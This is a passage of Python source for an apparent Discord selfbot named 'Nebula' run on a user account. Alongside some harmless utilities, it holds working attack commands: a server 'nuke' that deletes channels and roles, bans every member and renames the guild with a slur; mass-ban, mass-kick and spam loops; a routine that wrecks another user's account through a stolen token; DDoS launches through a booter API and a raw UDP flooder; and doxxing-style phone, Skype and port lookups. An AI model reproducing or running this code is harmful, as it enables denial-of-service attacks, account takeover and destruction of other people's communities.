    r = requests.get(f"https://api.c99.nl/phonelookup?key=&number={phone}").text.replace("<br>", "\n")
    embed=discord.Embed(title=f" **Info On {phone}** ", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


def friendsprint(*objects, sep = ' ', end = '\n ', file = sys.stdout):
    enc = file.encoding
    if enc == 'UTF-8':
        print(*objects, sep = sep, end = end, file = file)
    else:
        f = lambda obj: str(obj).encode(enc, errors = 'backslashreplace').decode(enc)
        print(*map(f, objects), sep = sep, end = end, file = file)

@client.command()
async def skypelookup(ctx, username):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/skyperesolver?key=&username={username}").text.replace(",", "\n")
    embed=discord.Embed(title=f" **Skype Lookup for {username}** ", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def backup(ctx):
    await ctx.message.delete()
    for user in client.user.friends:
        friendslist = (user.name)+'#'+(user.discriminator)
        friendsprint(friendslist)

@client.command()
async def upordown(ctx, site):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/upordown?key=&host={site}").text.replace("<br>", "\n")
    embed=discord.Embed(title=f" **Up or Down?** ", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def ldap(ctx, target, port, duration):
    await ctx.message.delete()
    url = "https://api.sleek.to/tests/launch"

    payload = {f"token": "s54624kf7Xuroy", 
           "target": f"{target}", 
           "port": f"{port}",
           "duration": f"{duration}",
           "method": "LDAP",
           "pps": "500000"
           }

    header = {"Content-type": "application/x-www-form-urlencoded",
          "Accept": "text/plain"} 

    response_decoded_json = requests.post(url, data=payload, headers=header)
    response_json = response_decoded_json.json()
    embed=discord.Embed(title=f" **Attack** ", description=f"{response_json}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def pxl(ctx):
    await ctx.message.delete()
    url = "https://api.pxl.blue/auth/login"

    payload = { "password": "joe", 
                "username": "charge",
                "rememberMe": "true"
           }

    header = {  "Content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36",
                
    }

    cookies = {
                    "__cfduid": "da2ea55e9751acdac94c8732904ec41ec1606870526",
                    "__cf_bm": "c1b7deacf85d8abbb45840ab2365579f0b37199c-1606870526-1800-AfCn8sZBBlp5wPvDDI23np10oZaQQb5J1mVV9o/ivsWF",
                    "session": "Bearer N3trBDDU4ad49O3Pd9S4sdddlqB8LReMw79AQ/kfbFTHH/FJ0kHi8rZggNteHqrBSq/Q72gx6NL+tpe76NwwFLbDdUu/e5zAMwFkPnexzecBfigAvzNkYS0eArd22IPH"

    }

    response_decoded_json = requests.post(url, data=payload, headers=header)
    response_json = response_decoded_json.json()
    embed=discord.Embed(title=f" **PXL POST** ", description=f"{response_json}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    await ctx.send(embed=embed)

@client.command()
async def instagram(ctx, username):
    r = requests.get(f"https://www.instagram.com/{username}/?__a=1").text
    data = json.loads(r, strict=False)
    em = discord.Embed(title=f"{username}'s Profile", color=0xbf00ff)
    em.add_field(name="Verified :", value=str(data[f"is_verified":{"count":()}]), inline=True)
    em.add_field(name="Folling :", value=str(data[f"edge_follow":{"count":()}]), inline=True)
    em.add_field(name="Followers :", value=str(data[f"edge_followed_by":{"count":()}]), inline=True)
    em.set_thumbnail(url=str(data[f'profile_pic_url':{"count":()}]))
    await ctx.send(embed=em, delete_after=10)


@client.command()
async def portscan(ctx, ipadd: str):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/portscanner?key=&host={ipadd}").text
    embed = discord.Embed(title=f" **Port Scan For {ipadd}** ", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.add_field(name="Open Ports: ", value=f"{r}", inline=False)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def spanish(ctx,*, text):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/translate?key=&text={text}&tolanguage=ES").text
    embed = discord.Embed(title="**Spanish Text**", description=f"**{r}**", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def russian(ctx,*, text):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/translate?key=&text={text}&tolanguage=RU").text
    embed = discord.Embed(title="**Russian Text**", description=f"**{r}**", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def subscan(ctx, text):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/subdomainfinder?key=&domain={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Subdomain Scan for {text}**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def headers(ctx, text):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/getheaders?key=&host={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Headers for {text}**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

# https://api.c99.nl/getheaders?key=<key>&host=example.com
@client.command()
async def torcheck(ctx, text):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/ipvalidator?key=&ip={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Tor Check for {text}**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def firewall(ctx, text):
    await ctx.message.delete() 
    r = requests.get(f"https://api.c99.nl/firewalldetector?key=&url={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Firewall Scan for {text}**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def dictionary(ctx, text):
    await ctx.message.delete() 
    r = requests.get(f"https://api.c99.nl/dictionary?key=&word={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Word lookup for {text}**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def yt2mp3(ctx, text):
    await ctx.message.delete() 
    r = requests.get(f"https://api.c99.nl/youtubemp3?key=&videoid={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**YT 2 MP3**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def passgen(ctx, text):
    await ctx.message.delete() 
    r = requests.get(f"https://api.c99.nl/passwordgenerator?key=&length={text}&include=numbers,letters,chars&customlist=abcdefghijklmnopqrstuvwyxyz12345678910!@#$%^&*()").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Password Generated!**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def webss(ctx, URL):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/createscreenshot?key=&url={URL}").text
    embed=discord.Embed(title=f" **{URL} Screenshot** ", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


# -- API COMMANDS -- #

@client.command()
async def illegal(ctx): 
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name='Raped',
            description="https://discord.gg/TEJbeeWEFx",
            reason="charge#0001",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name='Rape')
    for _i in range(250):
        await ctx.guild.create_role(name='Rape', color='0xbf00ff')

@client.command()
async def massban(ctx): 
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@client.command()
async def masskick(ctx): 
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    

@client.command()
async def users(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        print(user)


@client.command()
async def massrole(ctx): 
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name='NebulaSelfbot', color='0xbf00ff')
        except:
            return    

@client.command()
async def masschannel(ctx): 
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name='NebulaSelfbot')
        except:
            return

@client.command()
async def delchannels(ctx): 
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@client.command() 
async def delroles(ctx): 
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@client.command()
async def massunban(ctx): 
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass



@client.command()
async def tokeninfo(ctx, _token): 
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        embed=discord.Embed(title="Invalid Token!", color=0xbf00ff, timestamp=ctx.message.created_at)
        embed.set_footer(text=f'{footer} ')
        await ctx.send(embed=embed,delete_after=10)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})", color=0xbf00ff, timestamp=ctx.message.created_at)
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)
    
    fields = [
        {'name': 'Number', 'value': res['phone']},
        {'name': 'Auth: ', 'value': res['mfa_enabled']},
        {'name': 'Verified: ', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@client.command()
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {'Authorization': token}
    embed=discord.Embed(title="Nuking!", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_thumbnail(url="https://imgur.com/LIyGeCR")
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Nebula",
        'region': "europe"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.MAGENTA} | {e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.MAGENTA}[ERROR]: {Fore.MAGENTA}{e}"+Fore.RESET)
            else:
                break    

@client.command(aliases=["udox"])
async def userinfo(ctx, member: discord.Member = None):
    await ctx.message.delete()
    if not member:  
        member = ctx.message.author  
    roles = [role for role in member.roles if role != ctx.guild.default_role]
    embed = discord.Embed(color=0xbf00ff, timestamp=ctx.message.created_at,
                          title=f"User Info - {member}")
    embed.set_thumbnail(url=member.avatar_url)
    embed.set_author(name=f"{author}")
    embed.add_field(name="ID:", value=member.id)
    embed.add_field(name="Display Name:", value=member.display_name)

    embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))

    embed.add_field(name="Roles:", value=''.join([role.mention for role in roles]))
    embed.add_field(name="Highest Role:", value=member.top_role.mention)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command(name='unban')
async def _unban(ctx, id: int):
    user = await client.fetch_user(id)
    await ctx.guild.unban(user)
    embed=discord.Embed(title=f"Unbanned {id}!", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def embed(ctx, title: str, *, description):
    await ctx.message.delete()
    embed=discord.Embed(title=f"{title}",description=f"{description}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def ban(ctx, member : discord.Member, *, reason = None):
    await ctx.message.delete()
    await member.ban(reason = reason)
    embed=discord.Embed(title=f"Banned {member}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def tweet(ctx, username: str, *, message: str):
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed()
            em.color=0xbf00ff
            em.set_image(url=res["message"])
            await ctx.send(embed=em)



@client.command()
async def covid(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.covid19api.com/world/total")
    res = r.json()
    totalc = 'TotalConfirmed'
    totald = 'TotalDeaths'
    totalr = 'TotalRecovered'
    embed = discord.Embed(title=f' Updated Just Now ', color=0xbf00ff, timestamp=ctx.message.created_at) 
    embed.add_field(name="Deaths", value=f"**{res[totald]}**", inline=True)
    embed.add_field(name="Confirmed", value=f"**{res[totalc]}**", inline=True)
    embed.add_field(name="Recovered", value=f"**{res[totalr]}**", inline=True)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def d(ctx, limit: int=None): #CLEARS ALL MESSAGES
    await ctx.message.delete()
    passed = 0
    failed = 0
    async for msg in ctx.message.channel.history(limit=limit):
        if msg.author.id == client.user.id:
            try:
                await msg.delete()
                passed += 1
            except:
                failed += 1

@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@client.command()
async def mr(ctx, amount: int, *, emote):
    await ctx.message.delete() 
    messages = await ctx.message.channel.history(limit=amount).flatten()
    for message in messages:
        await message.add_reaction(emote) 

@client.command()
async def cleardms(ctx):
    await ctx.message.delete()
    for channel in client.private_channels:
                if isinstance(channel, discord.DMChannel):
                    async for msg in channel.history(limit=9999):
                        try:
                            if msg.author == client.user:
                                await msg.delete()
                                
                        except:
                             pass   

@client.command()
async def host2ip(ctx, *, host: str):
    await ctx.message.delete()
    ip = socket.gethostbyname(host)
    embed=discord.Embed(title="IP Found!",color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.add_field(name="IP", value=f"{ip}\n", inline=True)
    embed.add_field(name="Host", value=f"{host}", inline=True)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def b64decode(ctx, message):
    await ctx.message.delete()
    base64_message = f'{message}'
    base64_bytes = base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    decodee = message_bytes.decode('ascii')
    embed=discord.Embed(title=f"Decode for {message}!",description=f"{decodee}",color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def b64encode(ctx, *, message):
    await ctx.message.delete()
    message = f"{message}"
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')   
    embed=discord.Embed(title=f"Encoded!",description=f"{base64_message}",color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def yoink(ctx, *, message):
    await ctx.message.delete()
    message = f"{message}"
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')   
    embed=discord.Embed(title=f"",description=f"{base64_message}",color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def gethost(ctx, *, ip: str):
    await ctx.message.delete()
    host = socket.gethostbyaddr(ip)
    embed=discord.Embed(title="Host Found",color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.add_field(name="Host", value=f"{host}", inline=True)
    embed.add_field(name="IP", value=f"{ip}\n", inline=True)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def udprand(ctx, ip, port: int, dur: int):
    await ctx.message.delete()
    print (f"\033[32m{client.user.name}\033[39m sent an attack using udprand\033[35m to {ip} for {dur}\033[39m")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65500)
    data = [
        '\\x05',
        '\\xca',
        '\\x16',
        '\\x9c',
        '\\x11',
        '\\xf9',
        '\\x89',
        '\\x00',
        '\\x8b',
        '\\x45',
        '\\x7b',
        '\\xef',
        '\\x01',
        '\\x45',
        '\\xef',
        '\\xb9'
    ]
    payload = "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44".encode()

    stop = time.time() + dur
    embed=discord.Embed(title=f"‏‏‎Nebula", description=f"\n\n **Attack sent to {ip}** \n Port = {port} \n Time= {dur} \n Method = udphex",color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

    while time.time() < stop:
        sock.sendto(payload, (ip, port))

@client.command()
async def insta(ctx, *, name):
    await ctx.message.delete()
    x = requests.get(f"https://www.instagram.com/{name}/?__a=1").text

    try:
        load = json.loads(x)
        em = discord.Embed(title=f"{name}'s Insta info", color=0xbf00ff, timestamp=ctx.message.created_at)
        em.add_field(name="Following: ", value=str(load['graphql']['user']['edge_follow']['count']), inline=False)
        em.add_field(name="Followers: ", value=str(load['graphql']['user']['edge_followed_by']['count']), inline=False)
        em.add_field(name="Name: ", value=str(load['graphql']['user']['full_name']), inline=False)
        em.add_field(name="Number of posts: ", value=len(load['graphql']['user']['edge_owner_to_timeline_media']['edges']), inline=False)
        em.set_thumbnail(url=str(load['graphql']['user']['profile_pic_url']))
        em.set_footer(text=f'{footer} ')
        await ctx.send(embed=em, delete_after=10)
    except Exception as e:
        if "graphql" in str(e):
            em = discord.Embed(title=f"Invalid Username", color=0xbf00ff, timestamp=ctx.message.created_at)
            em.set_footer(text=f'{footer} ')
            await ctx.send(embed=em, delete_after=10)
        else:
            print(e)

@client.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}You do not have the corrent permissions" + Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}Missing arguments: {error}" + Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}invalid image" + Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}Discord error: {error}" + Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}Cant send empty message" + Fore.RESET)
    else:
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}{error_str}" + Fore.RESET)


@client.command()
async def watching(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{message}"))

loading()
client.run(token, reconnect=True, bot=False)
